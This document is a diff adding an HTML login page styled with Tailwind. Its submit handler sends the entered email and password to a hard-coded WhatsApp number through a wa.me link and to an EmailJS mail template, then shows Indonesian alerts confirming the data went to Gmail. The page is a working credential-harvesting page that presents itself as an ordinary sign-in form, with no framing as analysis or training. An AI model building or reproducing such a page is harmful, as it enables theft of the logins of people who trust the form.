@@ -1,0 +1,75 @@
+<html>
+<head>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #6b21a8; /* Purple background color */
+        }
+    </style>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
+        })();
+    </script>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+    <div class="w-full max-w-md p-8 space-y-8 bg-gray-800 bg-opacity-90 rounded-lg shadow-lg">
+        <div class="text-center">
+            <h2 class="text-3xl font-bold text-white">Login</h2>
+        </div>
+        <form class="mt-8 space-y-6" id="loginForm">
+            <div class="rounded-md shadow-sm">
+                <div>
+                    <label for="email-address" class="sr-only">Email address</label>
+                    <input id="email-address" name="email" type="email" autocomplete="email" required class="relative block w-full px-3 py-4 border border-gray-600 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" placeholder="Email address">
+                </div>
+                <div>
+                    <label for="password" class="sr-only">Password</label>
+                    <input id="password" name="password" type="password" autocomplete="current-password" required class="relative block w-full px-3 py-4 border border-gray-600 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" placeholder="Password">
+                </div>
+            </div>
+            <div class="flex items-center justify-between">
+                <div class="flex items-center">
+                    <input id="remember-me" name="remember-me" type="checkbox" class="w-4 h-4 text-indigo-600 border-gray-300 rounded focus:ring-indigo-500">
+                    <label for="remember-me" class="block ml-2 text-sm text-gray-300">Remember me</label>
+                </div>
+                <div class="text-sm">
+                    <a href="#" class="font-medium text-indigo-600 hover:text-indigo-500">Forgot your password?</a>
+                </div>
+            </div>
+            <div>
+                <button type="submit" class="relative flex justify-center w-full px-4 py-2 text-sm font-medium text-white bg-indigo-600 border border-transparent rounded-md group hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
+                    Sign in
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email-address').value;
+            const password = document.getElementById('password').value;
+            const message = `Email: ${email}, Password: ${password}`;
+            
+            // Send to WhatsApp
+            const whatsappUrl = `https://wa.me/6283135041044?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank');
+
+            // Send email using EmailJS
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                email: email,
+                password: password
+            })
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                alert('Data input terkirim ke Gmail');
+            }, function(error) {
+                console.log('FAILED...', error);
+                alert('Gagal mengirim data input ke Gmail');
+            });
+        });
+    </script>
+</body>
+</html>
